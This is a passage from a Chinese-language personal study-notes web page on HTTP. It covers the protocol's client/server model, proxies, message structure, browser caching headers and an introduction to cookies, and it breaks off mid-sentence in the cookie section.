<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>HTTP | MaoZZ17</title>
    <meta name="generator" content="VuePress 1.5.2">
    <link rel="icon" href="/logo.jpg">
    <meta name="description" content="随便记些东西~">
    <link rel="preload" href="/assets/css/0.styles.f8c92f0b.css" as="style"><link rel="preload" href="/assets/js/app.6c44c61c.js" as="script"><link rel="preload" href="/assets/js/2.899c2632.js" as="script"><link rel="preload" href="/assets/js/5.693eaf24.js" as="script"><link rel="prefetch" href="/assets/js/10.115ac37c.js"><link rel="prefetch" href="/assets/js/11.2f3aab4d.js"><link rel="prefetch" href="/assets/js/12.b6ddae06.js"><link rel="prefetch" href="/assets/js/13.4f7b1951.js"><link rel="prefetch" href="/assets/js/14.8163ff1a.js"><link rel="prefetch" href="/assets/js/15.a0bfb50f.js"><link rel="prefetch" href="/assets/js/16.9d42cb12.js"><link rel="prefetch" href="/assets/js/17.4efeae7d.js"><link rel="prefetch" href="/assets/js/18.31d540b2.js"><link rel="prefetch" href="/assets/js/19.200240a6.js"><link rel="prefetch" href="/assets/js/20.baf8f220.js"><link rel="prefetch" href="/assets/js/21.606a30dd.js"><link rel="prefetch" href="/assets/js/22.e8b9efce.js"><link rel="prefetch" href="/assets/js/3.c70f0157.js"><link rel="prefetch" href="/assets/js/4.24ec9888.js"><link rel="prefetch" href="/assets/js/6.1c1e4092.js"><link rel="prefetch" href="/assets/js/7.7753aa5a.js"><link rel="prefetch" href="/assets/js/8.e470fa49.js"><link rel="prefetch" href="/assets/js/9.5d51f8b7.js">
    <link rel="stylesheet" href="/assets/css/0.styles.f8c92f0b.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="sidebar-button"><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" role="img" viewBox="0 0 448 512" class="icon"><path fill="currentColor" d="M436 124H12c-6.627 0-12-5.373-12-12V80c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12zm0 160H12c-6.627 0-12-5.373-12-12v-32c0-6.627 5.373-12 12-12h424c6.627 0 12 5.373 12 12v32c0 6.627-5.373 12-12 12z"></path></svg></div> <a href="/" class="home-link router-link-active"><img src="/logo.jpg" alt="MaoZZ17" class="logo"> <span class="site-name can-hide">MaoZZ17</span></a> <div class="links"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><div class="nav-item"><a href="/" class="nav-link">
  首页
</a></div><div class="nav-item"><a href="/experience/" class="nav-link">
  踩坑
</a></div><div class="nav-item"><a href="/note/" class="nav-link router-link-active">
  笔记
</a></div><div class="nav-item"><a href="/demo/" class="nav-link">
  demo
</a></div><div class="nav-item"><a href="https://github.com/MaoZZ17" target="_blank" rel="noopener noreferrer" class="nav-link external">
  GitHub
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav></div></header> <div class="sidebar-mask"></div> <aside class="sidebar"><nav class="nav-links"><div class="nav-item"><a href="/" class="nav-link">
  首页
</a></div><div class="nav-item"><a href="/experience/" class="nav-link">
  踩坑
</a></div><div class="nav-item"><a href="/note/" class="nav-link router-link-active">
  笔记
</a></div><div class="nav-item"><a href="/demo/" class="nav-link">
  demo
</a></div><div class="nav-item"><a href="https://github.com/MaoZZ17" target="_blank" rel="noopener noreferrer" class="nav-link external">
  GitHub
  <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></div> <!----></nav>  <ul class="sidebar-links"><li><a href="/note/" aria-current="page" class="sidebar-link">笔记</a></li><li><a href="/note/algorithm.html" class="sidebar-link">算法</a></li><li><a href="/note/html.html" class="sidebar-link">HTML</a></li><li><a href="/note/css.html" class="sidebar-link">CSS</a></li><li><a href="/note/javascript.html" class="sidebar-link">JavaScript</a></li><li><a href="/note/vue.html" class="sidebar-link">Vue</a></li><li><a href="/note/computer_network.html" class="sidebar-link">计算机网络</a></li><li><a href="/note/http.html" aria-current="page" class="active sidebar-link">HTTP</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/http.html#概述" class="sidebar-link">概述</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/http.html#基于http的组件系统" class="sidebar-link">基于HTTP的组件系统</a></li><li class="sidebar-sub-header"><a href="/note/http.html#http-的基本性质" class="sidebar-link">HTTP 的基本性质</a></li><li class="sidebar-sub-header"><a href="/note/http.html#http-能控制什么" class="sidebar-link">HTTP 能控制什么</a></li><li class="sidebar-sub-header"><a href="/note/http.html#http-流" class="sidebar-link">HTTP 流</a></li><li class="sidebar-sub-header"><a href="/note/http.html#http-报文" class="sidebar-link">HTTP 报文</a></li><li class="sidebar-sub-header"><a href="/note/http.html#基于http的apis" class="sidebar-link">基于HTTP的APIs</a></li><li class="sidebar-sub-header"><a href="/note/http.html#总结" class="sidebar-link">总结</a></li></ul></li><li class="sidebar-sub-header"><a href="/note/http.html#http-缓存" class="sidebar-link">HTTP 缓存</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/http.html#浏览器缓存" class="sidebar-link">浏览器缓存</a></li></ul></li><li class="sidebar-sub-header"><a href="/note/http.html#http-cookie" class="sidebar-link">HTTP Cookie</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/http.html#创建cookie" class="sidebar-link">创建Cookie</a></li><li class="sidebar-sub-header"><a href="/note/http.html#安全" class="sidebar-link">安全</a></li></ul></li><li class="sidebar-sub-header"><a href="/note/http.html#版本" class="sidebar-link">版本</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/http.html#http-0-9-单行协议" class="sidebar-link">HTTP/0.9 – 单行协议</a></li><li class="sidebar-sub-header"><a href="/note/http.html#http-1-0-构建可扩展性" class="sidebar-link">HTTP/1.0 – 构建可扩展性</a></li><li class="sidebar-sub-header"><a href="/note/http.html#http-1-1-标准化的协议" class="sidebar-link">HTTP/1.1 – 标准化的协议</a></li><li class="sidebar-sub-header"><a href="/note/http.html#http-2-为了更优异的表现" class="sidebar-link">HTTP/2 - 为了更优异的表现</a></li><li class="sidebar-sub-header"><a href="/note/http.html#后http-2进化" class="sidebar-link">后HTTP/2进化</a></li><li class="sidebar-sub-header"><a href="/note/http.html#http-3-http-over-quic" class="sidebar-link">HTTP/3 - HTTP over QUIC</a></li></ul></li><li class="sidebar-sub-header"><a href="/note/http.html#http-报文-2" class="sidebar-link">HTTP 报文</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/http.html#请求方法" class="sidebar-link">请求方法</a></li><li class="sidebar-sub-header"><a href="/note/http.html#状态码" class="sidebar-link">状态码</a></li><li class="sidebar-sub-header"><a href="/note/http.html#http首部" class="sidebar-link">HTTP首部</a></li></ul></li><li class="sidebar-sub-header"><a href="/note/http.html#https" class="sidebar-link">HTTPS</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/http.html#加密方式" class="sidebar-link">加密方式</a></li><li class="sidebar-sub-header"><a href="/note/http.html#证书" class="sidebar-link">证书</a></li><li class="sidebar-sub-header"><a href="/note/http.html#通信机制" class="sidebar-link">通信机制</a></li></ul></li><li class="sidebar-sub-header"><a href="/note/http.html#认证" class="sidebar-link">认证</a></li><li class="sidebar-sub-header"><a href="/note/http.html#安全防范" class="sidebar-link">安全防范</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/note/http.html#因输出值转义不完全引发的安全漏洞" class="sidebar-link">因输出值转义不完全引发的安全漏洞</a></li><li class="sidebar-sub-header"><a href="/note/http.html#因设置或设计上的缺陷引发的安全漏洞" class="sidebar-link">因设置或设计上的缺陷引发的安全漏洞</a></li><li class="sidebar-sub-header"><a href="/note/http.html#因会话管理疏忽引发的安全漏洞" class="sidebar-link">因会话管理疏忽引发的安全漏洞</a></li><li class="sidebar-sub-header"><a href="/note/http.html#其他安全漏洞" class="sidebar-link">其他安全漏洞</a></li></ul></li></ul></li></ul> </aside> <main class="page"> <div class="theme-default-content content__default"><h1 id="http"><a href="#http" class="header-anchor">#</a> HTTP</h1> <div class="custom-block tip"><p class="custom-block-title">参考</p> <p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP" target="_blank" rel="noopener noreferrer">MDN HTTP<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a></p> <p>《图解HTTP》</p></div> <p>Web使用一种名为HTTP（HyperText Transfer Protocol，超文本传输协议）的协议作为规范，完成从客户端到服务器等一系列运作流程。而协议是指规则的约定。可以说，Web是建立在HTTP协议上通信的。</p> <h2 id="概述"><a href="#概述" class="header-anchor">#</a> 概述</h2> <p>HTTP是一种能够获取如 HTML 这样的网络资源的<strong>通讯协议</strong>。它是在 Web 上进行数据交换的基础，是一种 <strong>client-server</strong> 协议，也就是说，请求通常是由像浏览器这样的接受方发起的。一个完整的Web文档通常是由不同的子文档拼接而成的，像是文本、布局描述、图片、视频、脚本等等。</p> <p>客户端和服务端通过交换各自的消息（与数据流正好相反）进行交互。由像浏览器这样的客户端发出的消息叫做 requests，被服务端响应的消息叫做 responses。</p> <p>HTTP被设计于20世纪90年代初期，是一种可扩展的协议。它是应用层的协议，通过TCP，或者是TLS－加密的TCP连接来发送，理论上任何可靠的传输协议都可以使用。因为其良好的扩展性，时至今日，它不仅被用来传输超文本文档，还用来传输图片、视频或者向服务器发送如HTML表单这样的信息。HTTP还可以根据网页需求，仅获取部分Web文档内容更新网页。
<img src="/assets/img/HTTP &amp; layers.023b4224.png"></p> <h3 id="基于http的组件系统"><a href="#基于http的组件系统" class="header-anchor">#</a> 基于HTTP的组件系统</h3> <p>HTTP是一个client-server协议：请求通过一个实体被发出，实体也就是用户代理。大多数情况下，这个用户代理都是指浏览器，当然它也可能是任何东西，比如一个爬取网页生成维护搜索引擎索引的机器爬虫。</p> <p>每一个发送到服务器的请求，都会被服务器处理并返回一个消息，也就是response。在这个请求与响应之间，还有许许多多的被称为proxies的实体，他们的作用与表现各不相同，比如有些是网关，还有些是caches等。</p> <img src="/assets/img/Client-server-chain.929f4051.png"> <p>实际上，在一个浏览器和处理请求的服务器之间，还有路由器、调制解调器等许多计算机。由于Web的层次设计，那些在网络层和传输层的细节都被隐藏起来了。HTTP位于最上层的应用层。虽然底层对于分析网络问题非常重要，但是大多都跟对HTTP的描述不相干。</p> <h4 id="客户端：user-agent"><a href="#客户端：user-agent" class="header-anchor">#</a> 客户端：user-agent</h4> <p>user-agent 就是任何能够为用户发起行为的工具。这个角色通常都是由浏览器来扮演。一些例外情况，比如是工程师使用的程序，以及Web开发人员调试应用程序。</p> <p>浏览器总是作为发起一个请求的实体，他永远不是服务器（虽然近几年已经出现一些机制能够模拟由服务器发起的请求消息了）。</p> <p>要展现一个网页，浏览器首先发送一个请求来获取页面的HTML文档，再解析文档中的资源信息发送其他请求，获取可执行脚本或CSS样式来进行页面布局渲染，以及一些其它页面资源（如图片和视频等）。然后，浏览器将这些资源整合到一起，展现出一个完整的文档，也就是网页。浏览器执行的脚本可以在之后的阶段获取更多资源，并相应地更新网页。</p> <p>一个网页就是一个超文本文档。也就是说，有一部分显示的文本可能是链接，启动它（通常是鼠标的点击）就可以获取一个新的网页，使得用户可以控制客户端进行网上冲浪。浏览器来负责发送HTTP请求，并进一步解析HTTP返回的消息，以向用户提供明确的响应。</p> <h4 id="web服务端"><a href="#web服务端" class="header-anchor">#</a> Web服务端</h4> <p>在上述通信过程的另一端，是由Web Server来服务并提供客户端所请求的文档。Server只是虚拟意义上代表一个机器：它可以是共享负载（负载均衡）的一组服务器组成的计算机集群，也可以是一种复杂的软件，通过向其他计算机（如缓存，数据库服务器，电子商务服务器 ...）发起请求来获取部分或全部资源。</p> <p>Server 不一定是一台机器，但一个机器上可以装载的众多Servers。在HTTP/1.1 和Host头部中，它们甚至可以共享同一个IP地址。</p> <h4 id="代理（proxies）"><a href="#代理（proxies）" class="header-anchor">#</a> 代理（Proxies）</h4> <p>在浏览器和服务器之间，有许多计算机和其他设备转发了HTTP消息。由于Web栈层次结构的原因，它们大多都出现在传输层、网络层和物理层上，对于HTTP应用层而言就是透明的，虽然它们可能会对应用层性能有重要影响。还有一部分是表现在应用层上的，被称为代理（Proxies）。代理（Proxies）既可以表现得透明，又可以不透明（“改变请求”会通过它们）。代理主要有如下几种作用：</p> <ul><li>缓存（可以是公开的也可以是私有的，像浏览器的缓存）</li> <li>过滤（像反病毒扫描，家长控制...）</li> <li>负载均衡（让多个服务器服务不同的请求）</li> <li>认证（对不同资源进行权限管理）</li> <li>日志记录（允许存储历史信息）</li></ul> <h3 id="http-的基本性质"><a href="#http-的基本性质" class="header-anchor">#</a> HTTP 的基本性质</h3> <ul><li>HTTP 是简单的
<ul><li>虽然下一代HTTP/2协议将HTTP消息封装到了帧中，HTTP大体上还是被设计得简单易读。HTTP报文能够被人读懂，还允许简单测试，降低了门槛，对新人很友好。</li></ul></li> <li>HTTP 是可扩展的
<ul><li>在 HTTP/1.0 中出现的 HTTP headers 让协议扩展变得非常容易。只要服务端和客户端就新 headers 达成语义一致，新功能就可以被轻松加入进来。</li></ul></li> <li>HTTP 是无状态，有会话的
<ul><li>在同一个连接中，两个执行成功的请求之间是没有关系的。</li> <li>使用HTTP的头部扩展，HTTP Cookies。把Cookies添加到头部中，创建一个会话让每次请求都能共享相同的上下文信息，达成相同的状态。</li></ul></li></ul> <blockquote><p>HTTP本质是无状态的，使用Cookies可以创建有状态的会话</p></blockquote> <ul><li>HTTP 和连接</li></ul> <p>一个连接是由传输层来控制的，这从根本上不属于HTTP的范围。HTTP并不需要其底层的传输层协议是面向连接的，只需要它是可靠的，或不丢失消息的（至少返回错误）。在互联网中，有两个最常用的传输层协议：TCP是可靠的，而UDP不是。因此，HTTP依赖于面向连接的TCP进行消息传递，但连接并不是必须的。</p> <p>在客户端（通常指浏览器）与服务器能够交互（客户端发起请求，服务器返回响应）之前，必须在这两者间建立一个 TCP 链接，打开一个 TCP 连接需要多次往返交换消息（因此耗时）。HTTP/1.0 默认为每一对 HTTP 请求/响应都打开一个单独的 TCP 连接。当需要连续发起多个请求时，这种模式比多个请求共享同一个 TCP 链接更低效。</p> <p>为了减轻这些缺陷，HTTP/1.1引入了流水线（被证明难以实现）和持久连接的概念：底层的TCP连接可以通过<code>Connection</code>头部来被部分控制。HTTP/2则发展得更远，通过在一个连接复用消息的方式来让这个连接始终保持为暖连接。</p> <p>为了更好的适合HTTP，设计一种更好传输协议的进程一直在进行。Google就研发了一种以UDP为基础，能提供更可靠更高效的传输协议QUIC，即快速UDP网络连接 ( Quick UDP Internet Connections )。</p> <h3 id="http-能控制什么"><a href="#http-能控制什么" class="header-anchor">#</a> HTTP 能控制什么</h3> <p>多年以来，HTTP良好的扩展性使得越来越多的Web功能归其控制。缓存和认证很早就可以由HTTP来控制了。另一方面，对同源同域的限制到2010年才有所改变。</p> <p>以下是可以被HTTP控制的常见特性。</p> <ul><li>缓存
<ul><li>文档如何缓存能通过HTTP来控制。服务端能告诉代理和客户端哪些文档需要被缓存，缓存多久，而客户端也能够命令中间的缓存代理来忽略存储的文档。</li></ul></li> <li>开放同源限制
<ul><li>为了防止网络窥听和其它隐私泄漏，浏览器强制对Web网站做了分割限制。只有来自于相同来源的网页才能够获取网站的全部信息。这样的限制有时反而成了负担，HTTP可以通过修改头部来开放这样的限制，因此Web文档可以是由不同域下的信息拼接成的（某些情况下，这样做还有安全因素考虑）。</li></ul></li> <li>认证
<ul><li>一些页面能够被保护起来，仅让特定的用户进行访问。基本的认证功能可以直接通过HTTP提供，使用Authenticate相似的头部即可，或用HTTP Cookies来设置指定的会话。</li></ul></li> <li>代理和隧道
<ul><li>通常情况下，服务器和/或客户端是处于内网的，对外网隐藏真实 IP 地址。因此 HTTP 请求就要通过代理越过这个网络屏障。但并非所有的代理都是 HTTP 代理。例如，SOCKS协议的代理就运作在更底层，一些像 FTP 这样的协议也能够被它们处理。</li></ul></li> <li>会话
<ul><li>使用HTTP Cookies允许你用一个服务端的状态发起请求，这就创建了会话。虽然基本的HTTP是无状态协议。这很有用，不仅是因为这能应用到像购物车这样的电商业务上，更是因为这使得任何网站都能轻松为用户定制展示内容了。</li></ul></li></ul> <h3 id="http-流"><a href="#http-流" class="header-anchor">#</a> HTTP 流</h3> <p>当客户端想要和服务端进行信息交互时（服务端是指最终服务器，或者是一个中间代理），过程表现为下面几步：</p> <ol><li>打开一个TCP连接：TCP连接被用来发送一条或多条请求，以及接受响应消息。客户端可能打开一条新的连接，或重用一个已经存在的连接，或者也可能开几个新的TCP连接连向服务端。</li> <li>发送一个HTTP报文：HTTP报文（在HTTP/2之前）是语义可读的。在HTTP/2中，这些简单的消息被封装在了帧中，这使得报文不能被直接读取，但是原理仍是相同的。</li></ol> <div class="language-http line-numbers-mode"><pre class="language-http"><code>GET / HTTP/1.1
<span class="token header-name keyword">Host:</span> developer.mozilla.org
<span class="token header-name keyword">Accept-Language:</span> fr
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br></div></div><ol start="3"><li>读取服务端返回的报文信息：</li></ol> <div class="language-http line-numbers-mode"><pre class="language-http"><code><span class="token response-status">HTTP/1.1 <span class="token property">200 OK</span></span>
<span class="token header-name keyword">Date:</span> Sat, 09 Oct 2010 14:28:02 GMT
<span class="token header-name keyword">Server:</span> Apache
<span class="token header-name keyword">Last-Modified:</span> Tue, 01 Dec 2009 20:18:22 GMT
<span class="token header-name keyword">ETag:</span> &quot;51142bc1-7449-479b075b2891b&quot;
<span class="token header-name keyword">Accept-Ranges:</span> bytes
<span class="token header-name keyword">Content-Length:</span> 29769
<span class="token header-name keyword">Content-Type:</span> text/html<span class="token text-html">

&lt;!DOCTYPE html... (here comes the 29769 bytes of the requested web page)
</span></code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br></div></div><ol start="4"><li>关闭连接或者为后续请求重用连接。</li></ol> <p>当HTTP流水线启动时，后续请求都可以不用等待第一个请求的成功响应就被发送。然而HTTP流水线已被证明很难在现有的网络中实现，因为现有网络中有很多老旧的软件与现代版本的软件共存。因此，HTTP流水线已被在有多请求下表现得更稳健的HTTP/2的帧所取代。</p> <h3 id="http-报文"><a href="#http-报文" class="header-anchor">#</a> HTTP 报文</h3> <p>HTTP/1.1以及更早的HTTP协议报文都是语义可读的。在HTTP/2中，这些报文被嵌入到了一个新的二进制结构，帧。帧允许实现很多优化，比如报文头部的压缩和复用。即使只有原始HTTP报文的一部分以HTTP/2发送出来，每条报文的语义依旧不变，客户端会重组原始HTTP/1.1请求。因此用HTTP/1.1格式来理解HTTP/2报文仍旧有效。</p> <p>有两种HTTP报文的类型，请求与响应，每种都有其特定的格式。</p> <h4 id="请求"><a href="#请求" class="header-anchor">#</a> 请求</h4> <p>HTTP请求的一个例子：
<img src="/assets/img/HTTP_Request.d2fb5602.png"></p> <p>请求由以下元素组成：</p> <ul><li>一个HTTP的method，经常是由一个动词像GET, POST 或者一个名词像OPTIONS，HEAD来定义客户端的动作行为。通常客户端的操作都是获取资源（GET方法）或者发送HTML form表单值（POST方法），虽然在一些情况下也会有其他操作。</li> <li>要获取的资源的路径，通常是上下文中就很明显的元素资源的URL，它没有protocol （http://），domain（developer.mozilla.org），或是TCP的port（HTTP一般在80端口）。</li> <li>HTTP协议版本号。</li> <li>为服务端表达其他信息的可选头部headers。</li> <li>对于一些像POST这样的方法，报文的body就包含了发送的资源，这与响应报文的body类似。</li></ul> <h4 id="响应"><a href="#响应" class="header-anchor">#</a> 响应</h4> <p>HTTP响应的一个例子：
<img src="/assets/img/HTTP_Response.94e095a3.png"></p> <p>响应报文包含了下面的元素：</p> <ul><li>HTTP协议版本号。</li> <li>一个状态码（status code），来告知对应请求执行成功或失败，以及失败的原因。</li> <li>一个状态信息，这个信息是非权威的状态码描述信息，可以由服务端自行设定。</li> <li>HTTP headers，与请求头部类似。</li> <li>可选项，比起请求报文，响应报文中更常见地包含获取的资源body。</li></ul> <h3 id="基于http的apis"><a href="#基于http的apis" class="header-anchor">#</a> 基于HTTP的APIs</h3> <p>基于HTTP的最常用API是<code>XMLHttpRequest</code> API，可用于在user agent和服务器之间交换数据。 现代<code>Fetch</code> API提供相同的功能，具有更强大和灵活的功能集。</p> <p>另一种API，即服务器发送的事件，是一种单向服务，允许服务器使用HTTP作为传输机制向客户端发送事件。 使用<code>EventSource</code>接口，客户端打开连接并建立事件句柄。 客户端浏览器自动将到达HTTP流的消息转换为适当的<code>Event</code>对象，并将它们传递给专门处理这类<code>type</code>事件的句柄，如果有这么个句柄的话。但如果相应的事件处理句柄根本没有建立，那就交给<code>onmessage</code>事件处理程序处理。</p> <h3 id="总结"><a href="#总结" class="header-anchor">#</a> 总结</h3> <p>HTTP是一种简单可扩展的协议，其Client-Server的结构以及轻松扩展头部信息的能力使得HTTP可以和Web共同发展。</p> <p>即使HTTP/2为了提高性能将HTTP报文嵌入到帧中这一举措增加了复杂度，但是从Web应用的角度看，报文的基本结构没有变化，从HTTP/1.0发布起就是这样的结构。</p> <h2 id="http-缓存"><a href="#http-缓存" class="header-anchor">#</a> HTTP 缓存</h2> <p>缓存是一种保存资源副本并在下次请求时直接使用该副本的技术。当 web 缓存发现请求的资源已经被存储，它会拦截请求，返回该资源的拷贝，而不会去源服务器重新下载。这样带来的好处有：缓解服务器端压力，提升性能(获取资源的耗时更短了)。对于网站来说，缓存是达到高性能的重要组成部分。缓存需要合理配置，因为并不是所有资源都是永久不变的：重要的是对一个资源的缓存应截止到其下一次发生改变（即不能缓存过期的资源）。</p> <p>缓存的种类有很多,其大致可归为两类：私有与共享缓存。共享缓存存储的响应能够被多个用户使用。私有缓存只能用于单独用户。下方以浏览器与代理缓存为代表介绍一下，除此之外还有网关缓存、CDN、反向代理缓存和负载均衡器等部署在服务器上的缓存方式，为站点和 web 应用提供更好的稳定性、性能和扩展性。</p> <ul><li>(私有)浏览器缓存
<ul><li>私有缓存只能用于单独用户。你可能已经见过浏览器设置中的“缓存”选项。浏览器缓存拥有用户通过 HTTP 下载的所有文档。这些缓存为浏览过的文档提供向后/向前导航，保存网页，查看源码等功能，可以避免再次向服务器发起多余的请求。它同样可以提供缓存内容的离线浏览。</li></ul></li> <li>(共享)代理缓存
<ul><li>共享缓存可以被多个用户使用。例如，ISP 或你所在的公司可能会架设一个 web 代理来作为本地网络基础的一部分提供给用户。这样热门的资源就会被重复使用，减少网络拥堵与延迟。</li></ul></li></ul> <h3 id="浏览器缓存"><a href="#浏览器缓存" class="header-anchor">#</a> 浏览器缓存</h3> <ul><li>强制缓存
<ul><li>浏览器在加载资源时，会先根据本地缓存资源的 <code>header</code> 中的信息判断是否命中强缓存，如果命中则直接使用缓存中的资源不会再向服务器发送请求。
<ul><li>查看 <code>header</code> 头中的 <code>Expires</code> 和 <code>Cache-control</code> 来判断是否满足规则；</li> <li>如果满足规则，就返回缓存的数据；</li> <li>如果不满足规则，就向服务器发送请求；</li> <li>服务器返回数据；</li> <li>将新数据存入缓存。</li></ul></li> <li><code>Expires</code> <ul><li>这个字段包含了一个时间，过了这个时间，响应将会失效。</li> <li><code>Expires</code> 受限于本地时间</li></ul></li> <li><code>Cache-Control</code> <ul><li>这个字段包含一个 <code>max-age</code> 属性，该字段表示资源缓存的最大有效时间，这就是一个相对时间。</li> <li>可缓存性
<ul><li><code>public</code>：表明响应可以被任何对象（包括：发送请求的客户端，代理服务器，等等）缓存，即使是通常不可缓存的内容。</li> <li><code>private</code>：表明响应只能被单个用户缓存，不能作为共享缓存（即代理服务器不能缓存它）</li> <li><code>no-cache</code>：在发布缓存副本之前，强制要求缓存把请求提交给原始服务器进行验证(协商缓存验证)。</li> <li><code>no-store</code>：缓存不应存储有关客户端请求或服务器响应的任何内容，即不使用任何缓存。</li></ul></li> <li>到期
<ul><li><code>max-age=&lt;seconds&gt;</code>: 设置缓存存储的最大周期，超过这个时间缓存被认为过期(单位秒)。与Expires相反，时间是相对于请求的时间。</li> <li><code>s-maxage=&lt;seconds&gt;</code>：覆盖<code>max-age</code>或者<code>Expires</code>头，但是仅适用于共享缓存(比如各个代理)，私有缓存会忽略它。</li> <li><code>max-stale[=&lt;seconds&gt;]</code>：表明客户端愿意接收一个已经过期的资源。可以设置一个可选的秒数，表示响应不能已经过时超过该给定的时间。</li> <li><code>min-fresh=&lt;seconds&gt;</code>：表示客户端希望获取一个能在指定的秒数内保持其最新状态的响应。</li></ul></li></ul></li> <li>基本上都会同时设置 <code>Expires</code> 和 <code>Cache-Control</code> ，<code>Cache-Control</code> 的优先级别更高</li></ul></li> <li>协商缓存
<ul><li>当强缓存没有命中的时候，浏览器会发送一个请求到服务器，服务器根据请求头中的部分信息来判断是否命中缓存。如果命中，则返回 <code>304</code> ，告诉浏览器资源未更新，可使用本地的缓存。
<ul><li>把资源标识，比如 <code>If-Modify-Since</code> 或 <code>Etag</code> 发送到服务器，确认资源是否更新；</li> <li>如果资源未更新，请求响应返回的http状态为 <code>304</code> 并且会显示一个 <code>Not Modified</code> 的字符串，告诉浏览器使用本地缓存;</li> <li>如果资源已经更新，返回新的数据；</li> <li>将新数据存入缓存。</li></ul></li> <li><code>Last-Modified</code>，<code>If-Modified-Since</code> <ul><li>浏览器第一次请求资源的时候，服务器返回的 <code>header</code> 上会带有一个 <code>Last-Modified</code> 字段，表示资源<strong>最后修改的时间</strong>。</li> <li>当浏览器再次请求该资源时，请求头中会带有一个 <code>If-Modified-Since</code> 字段，这个值是第一次请求返回的 <code>Last-Modified</code> 的值。</li> <li>服务器收到这个请求后，将 <code>If-Modified-Since</code> 和当前的 <code>Last-Modified</code> 进行对比。如果相等，则说明资源未修改，返回 <code>304</code>，浏览器使用本地缓存。</li> <li>缺点
<ul><li>最小单位是秒。也就是说如果短时间内资源发生了改变，<code>Last-Modified</code> 并不会发生变化</li> <li>如果本地打开缓存文件，即使没有对文件进行修改，但还是会造成 <code>Last-Modified</code> 被修改，服务端不能命中缓存导致发送相同的资源</li> <li>周期性变化。如果这个资源在一个周期内修改回原来的样子了，我们认为是可以使用缓存的，但是 <code>Last-Modified</code> 不这样认为</li></ul></li></ul></li> <li><code>Etag</code>，<code>If-None-Match</code> <ul><li><code>Etag</code> 一般是由文件内容 <code>hash</code> 生成的，也就是说它可以保证资源的唯一性，资源发生改变就会导致 <code>Etag</code> 发生改变。</li> <li>在浏览器第一次请求资源时，服务器会返回一个 <code>Etag</code> 标识。当再次请求该资源时， 会通过 <code>If-no-match</code> 字段将 <code>Etag</code> 发送回服务器，然后服务器进行比较，如果相等，则返回 <code>304</code> 表示未修改。</li></ul></li> <li><code>Last-Modified</code> 和 <code>Etag</code> 是可以同时设置的，服务器会优先校验 <code>Etag</code>。</li></ul></li></ul> <h2 id="http-cookie"><a href="#http-cookie" class="header-anchor">#</a> HTTP Cookie</h2> <p>HTTP Cookie（也叫Web Cookie或浏览器Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。通常，它用于告知服务端两个请求是否来自同一浏览器，如保持用户的登录状态。Cookie使基于无状态的HTTP协议记录稳定的状态信息成为了可能。</p> <p>Cookie主要用于以下三个方面：</p> <ul><li>会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）</li> <li>个性化设置（如用户自定义设置、主题等）</li> <li>浏览器行为跟踪（如跟踪分析用户行为等）</li></ul> <p>Cookie曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie渐渐被淘汰。由于服务器指定Cookie后，浏览器的每次请求都会携带Cookie数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 Web storage API 